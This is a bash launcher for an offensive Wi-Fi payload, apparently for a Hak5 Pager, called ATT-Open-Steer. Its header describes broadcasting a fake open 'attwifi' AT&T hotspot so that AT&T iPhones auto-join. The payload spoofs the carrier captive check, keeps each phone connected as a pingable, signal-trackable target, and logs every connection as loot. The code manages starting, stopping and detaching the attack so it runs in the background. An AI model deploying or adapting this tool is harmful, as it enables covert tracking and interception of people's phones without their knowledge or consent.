#!/bin/bash
## Title: ATT-Open-Steer (attwifi lure: persistent iPhone tracking)
## Description: Toggle payload. Hosts an open `attwifi` BSS (the AT&T managed-open
##              profile) so AT&T iPhones silently auto-join, complete the carrier
##              captive check (DNS/WISPr spoof), get real internet through the
##              Pager's client-mode uplink, and stay connected as a pingable /
##              RSSI-trackable target. Alerts + loots on every attwifi connect.
## Version: 4
## Author: Skinny Research & Development
##
## PAGER UI TOGGLE
##   Run from the payload menu -> "start or stop the payload?" -> Start / Stop.
##     - Start: launches the orchestrator DETACHED (background) and returns, so
##       the Pager screen is freed for other tasks. The payload keeps running.
##     - Stop: signals the orchestrator (clean teardown: factory wpad restored,
##       wireless/pineapd/dnsmasq/radio state restored) then force-heals.
##
##   Start is hard-wired to the proven open-only path (no Passpoint lure):
##       --no-enterprise --steer-mode off --no-isolate
##
##   The orchestrator is exec'd under `setsid`, so it survives this launcher
##   exiting and is not killed when the Pager UI closes the payload screen.
##   Its PID is recorded in /tmp/att-open-steer.pid.
##
##   Manual control (SSH/serial/tmux):
##       ./payload.sh start
##       ./payload.sh stop
##       ./payload.sh status
##
## Notes:
##   - Requires the WPAD-SWAP engine (staged at /mmc/root/wpad-swap).
##   - Do NOT run over a Wi-Fi SSH session (the wpad restart drops it). Use
##     USB-C Ethernet (br-lan) or on-Pager tmux. The orchestrator refuses
##     otherwise; set ATT_FORCE_WLAN0CLI=1 to override.
##   - Loot: /mmc/root/loot/att-open-steer/ (run-*/ + YYYYMMDD-attwifi-connect.log)

# The Pager UI launches payloads with a minimal PATH; pin the standard tool
# dirs so every helper (hostapd_cli, iw, nft, pgrep, ...) resolves.
export PATH="/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-}"

# ---------------------------------------------------------------------------
# paths (resolved robustly; $0/dirname can be unreliable from the Pager UI)
# ---------------------------------------------------------------------------
SCRIPT_DIR="$(cd "$(dirname "$0")" 2>/dev/null && pwd)"
PY="$SCRIPT_DIR/att-open-steer.py"
if [ ! -f "$PY" ]; then
    for c in /mmc/root/payloads/user/Skinny-Tools/ATT-Open-Steer \
             /root/payloads/user/Skinny-Tools/ATT-Open-Steer; do
        [ -f "$c/att-open-steer.py" ] && { SCRIPT_DIR="$c"; PY="$c/att-open-steer.py"; break; }
    done
fi

PIDFILE="/tmp/att-open-steer.pid"
OUT="/tmp/att-open-steer.out"
DBG="/tmp/att-open-steer-toggle.log"
LOOT="/mmc/root/loot/att-open-steer"
MARKER="[loop] waiting for iPhone"
START_BUDGET=180     # seconds to wait for the payload to report fully running
STOP_BUDGET=60       # seconds to wait for the orchestrator's cleanup() to finish

dbg() { printf '%s | %s\n' "$(date '+%H:%M:%S')" "$*" >> "$DBG" 2>/dev/null; }

find_engine() {
    for c in "${WPAD_SWAP:-}" \
             /mmc/root/payloads/user/utilities/WPAD-SWAP/wpad-swap.sh \
             /root/payloads/user/utilities/WPAD-SWAP/wpad-swap.sh; do
        [ -n "$c" ] && [ -x "$c" ] && { printf '%s' "$c"; return 0; }
    done
    return 1
}

newest_run() { ls -1dt "$LOOT"/run-* 2>/dev/null | head -1; }

# ---------------------------------------------------------------------------
# running detection + stop
# ---------------------------------------------------------------------------
running_pid() {
    local pid
    pid="$(cat "$PIDFILE" 2>/dev/null)"
    if [ -n "${pid:-}" ] && kill -0 "$pid" 2>/dev/null; then
        printf '%s' "$pid"; return 0
    fi
    # Fall back to a process scan (PID file may be stale/missing).
    pid="$(pgrep -f "att-open-steer[.]py" 2>/dev/null | head -1)"
    [ -n "$pid" ] && { printf '%s' "$pid"; return 0; }
    return 1
}

stop_payload() {
    local pid i p
    pid="$(cat "$PIDFILE" 2>/dev/null)"
    if [ -n "${pid:-}" ] && kill -0 "$pid" 2>/dev/null; then
        dbg "stop: SIGTERM pid=$pid"
        kill -TERM "$pid" 2>/dev/null
    fi
    # Also signal any stragglers (PID file may be stale).
    for p in $(pgrep -f "att-open-steer[.]py" 2>/dev/null); do
        [ "$p" != "${pid:-}" ] && kill -TERM "$p" 2>/dev/null
    done

    # Wait for the orchestrator's signal handlers/cleanup() to finish restoring.
    i=0
    while [ "$i" -lt "$STOP_BUDGET" ]; do
        [ -z "$(pgrep -f 'att-open-steer[.]py' 2>/dev/null)" ] && break
        sleep 1; i=$((i+1))
    done
    # Hard kill anything that ignored the graceful stop.
    for p in $(pgrep -f "att-open-steer[.]py" 2>/dev/null); do kill -KILL "$p" 2>/dev/null; done
    for p in $(pgrep -f "v28_wispr[.]py" 2>/dev/null); do kill -9 "$p" 2>/dev/null; done
    for p in $(pgrep -f "radius-reject[.]py" 2>/dev/null); do kill -9 "$p" 2>/dev/null; done
    for p in $(pgrep -f "v28_dhcpd[.]py" 2>/dev/null); do kill -9 "$p" 2>/dev/null; done
    rm -f "$PIDFILE"

    # Force-heal: restore factory wpad and re-apply the wireless config, even
    # if the orchestrator was killed before its own cleanup finished.
    local eng
    eng="$(find_engine)" && "$eng" recover >/dev/null 2>&1
    restore_state_files
    wifi reload >/dev/null 2>&1
    dbg "stop: force recover + wifi reload done"
}

# restore_state_files: if the orchestrator was SIGKILLed mid-cleanup its
# persistent backups remain. Restore them so the Pager never stays configured
# to broadcast attwifi / keep PineAP disabled outside the payload.
restore_state_files() {
    local s=/mmc/root/.att-open-steer reload=0
    if [ -f "$s/wireless.bak" ]; then
        cp "$s/wireless.bak" /etc/config/wireless && rm -f "$s/wireless.bak" && reload=1
    fi
    if [ -f "$s/pineapd.bak" ]; then
        cp "$s/pineapd.bak" /etc/config/pineapd && rm -f "$s/pineapd.bak" && \
            /etc/init.d/pineapd restart >/dev/null 2>&1
    fi
    if [ -f "$s/radio-mac.bak" ]; then
        cat "$s/radio-mac.bak" > /sys/class/ieee80211/phy0/macaddress 2>/dev/null
        rm -f "$s/radio-mac.bak"
    fi
    [ "$reload" = 1 ] && { uci commit wireless 2>/dev/null; dbg "stop: restored leftover wireless backup"; }
    return 0
}

# ---------------------------------------------------------------------------
# PineAP: make sure attwifi is never impersonated/advertised by PineAP.
# The comment filter is the network filter (pineapd.@ssid_filter[0]); a name on
# the DENY list is never advertised regardless of allow/deny mode. Idempotent:
# only acts when one of the two names is missing from the deny list.
# ---------------------------------------------------------------------------
ensure_attwifi_exclusion() {
    local deny missing=""
    deny="$(PINEAPPLE_NETWORK_FILTER_LIST deny 2>/dev/null)"
    for s in "attwifi" "AT&T Secure Wi-Fi"; do
        printf '%s\n' "$deny" | grep -qxF "$s" || missing="$missing $s"
    done
    if [ -n "$missing" ]; then
        dbg "pineap exclusion missing:$missing -> applying"
        LOG yellow "PineAP: adding attwifi exclusion ($missing)..."
        PINEAPPLE_NETWORK_FILTER_DELETE allow "attwifi" "AT&T Secure Wi-Fi" >/dev/null 2>&1
        PINEAPPLE_NETWORK_FILTER_ADD deny "attwifi" "AT&T Secure Wi-Fi" >/dev/null 2>&1
        PINEAPPLE_SSID_POOL_DELETE "attwifi" "AT&T Secure Wi-Fi" >/dev/null 2>&1
        LOG green "PineAP: attwifi exclusion applied."
    else
        dbg "pineap exclusion already set -> skipping"
        LOG "PineAP: attwifi exclusion already set - skipping."
    fi
}

# ---------------------------------------------------------------------------
# start (open-only), detached so the screen is released
# ---------------------------------------------------------------------------
start_payload() {
    local rp before cur pid i deadline ok eng
    rp="$(running_pid)"
    if [ -n "${rp:-}" ]; then
        ALERT "ATT-Open-Steer is already RUNNING (pid $rp)."
        return 0
    fi

    ensure_attwifi_exclusion

    eng="$(find_engine)" || {
        ALERT "WPAD-SWAP engine missing.\nRun the Skinny-Tools installer."
        return 1
    }
    [ -f "$PY" ] || { ALERT "Orchestrator missing at:\n$PY"; return 1; }

    before="$(newest_run)"
    rm -f "$PIDFILE"
    dbg "start: py='$PY' before_run='$before'"

    LOG green "ATT-Open-Steer: starting (open-only)..."
    # Detach into a new session so the process survives this launcher exiting
    # and the Pager UI closing the payload screen. stdin from /dev/null and
    # stdout/stderr to a file so no pipe is held open.
    setsid python3 "$PY" --no-enterprise --steer-mode off --no-isolate --force \
        </dev/null >>"$OUT" 2>&1 &

    # Discover the orchestrator PID (setsid may fork, so $! is not reliable).
    pid=""
    i=0
    while [ "$i" -lt 50 ]; do
        pid="$(pgrep -f 'att-open-steer[.]py' 2>/dev/null | head -1)"
        [ -n "$pid" ] && break
        sleep 0.2; i=$((i+1))
    done
    [ -n "$pid" ] && echo "$pid" > "$PIDFILE"
    dbg "start: discovered pid='$pid'"

    # Wait (bounded) until the orchestrator reports the open BSS is up and the
    # main loop is running, so we can tell the operator it is fully running.
    deadline=$(( $(date +%s) + START_BUDGET ))
    ok=0
    while [ "$(date +%s)" -lt "$deadline" ]; do
        rp="$(running_pid)"
        if [ -z "${rp:-}" ]; then
            dbg "start: process exited before marker"
            break
        fi
        cur="$(newest_run)"
        if [ -n "$cur" ] && [ "$cur" != "$before" ] && \
           grep -qF "$MARKER" "$cur/run.log" 2>/dev/null; then
            ok=1
            break
        fi
        sleep 2
    done

    if [ "$ok" = "1" ]; then
        dbg "start: RUNNING pid=$(running_pid)"
        LOG green "ATT-Open-Steer is RUNNING (pid $(running_pid))."
        ALERT "ATT-Open-Steer is RUNNING (pid $(running_pid)).\nLoot: $LOOT"
        return 0
    fi

    dbg "start: FAILED to confirm running"
    LOG red "ATT-Open-Steer failed to confirm startup."
    [ -f "$OUT" ] && tail -n 12 "$OUT" 2>/dev/null | while IFS= read -r l; do LOG "$l"; done
    ALERT "ATT-Open-Steer did NOT reach the running state.\nCheck: $OUT"
    return 1
}

# ---------------------------------------------------------------------------
# CLI (headless testing / scripts)
# ---------------------------------------------------------------------------
case "${1:-}" in
    start)  start_payload; exit $? ;;
    stop)   stop_payload; ensure_attwifi_exclusion; ALERT "ATT-Open-Steer stopped."; exit 0 ;;
    status)
        rp="$(running_pid)"
        if [ -n "${rp:-}" ]; then
            printf 'ATT-Open-Steer RUNNING (pid %s)\n' "$rp"
            tail -n 5 "$(newest_run)/run.log" 2>/dev/null
        else
            printf 'ATT-Open-Steer NOT running\n'
        fi
        exit 0 ;;
esac

# ---------------------------------------------------------------------------
# Pager UI toggle: just ask start or stop
# ---------------------------------------------------------------------------
if [ -n "$(running_pid)" ]; then DEF="Stop"; else DEF="Start"; fi
ANS="$(LIST_PICKER "ATT-Open-Steer: start or stop the payload?" \
        "Start" "Stop" "Exit" "$DEF" 2>/dev/null)"
ANS="${ANS%$'\r'}"
dbg "list_picker returned '${ANS}'"
case "$ANS" in
    Start) start_payload ;;
    Stop)
        LOG green "Stopping ATT-Open-Steer..."
        stop_payload
        ensure_attwifi_exclusion
        ALERT "ATT-Open-Steer stopped."
        ;;
    *) exit 0 ;;
esac
exit 0
